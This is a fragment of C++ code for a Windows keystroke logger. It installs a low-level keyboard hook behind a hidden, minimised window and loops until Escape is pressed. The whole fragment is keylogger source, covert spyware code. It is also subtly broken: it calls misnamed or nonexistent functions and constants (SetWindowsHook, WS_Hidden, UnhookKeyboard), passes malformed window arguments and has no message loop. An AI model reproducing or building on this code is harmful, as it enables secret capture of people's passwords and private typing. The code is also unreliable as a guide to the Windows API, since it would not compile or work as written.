    hKeyboardHook = SetWindowsHook(WH_KEYBOARD_LL, KeyboardHookProc);

    // Check if hook was installed successfully
    if (hKeyboardHook == NULL) {
        cout << "Failed to install keyboard hook!" << endl;
        return 1;
    }

    // Create a window to minimize the hook's impact
    HWND hwnd = CreateWindowEx(0, "Keystroke Logger", 0, 0, 0, 0, WS_Hidden | WS_MINIMIZE, 0, 0, NULL, NULL);
    if (hwnd == NULL) {
        cout << "Failed to create window!" << endl;
        return 1;
    }

    // Start the loop to monitor keystrokes
    while (true) {
        // Sleep to prevent high CPU usage
        Sleep(100);
        // Break condition, e.g., when the user presses a specific key
        if (GetAsyncKeyState(VK_ESCAPE)) {
            break;
        }
    }

    // Remove the hook
    UnhookKeyboard(hKeyboardHook);
    DestroyWindow(hwnd);

    return 0;
}
```

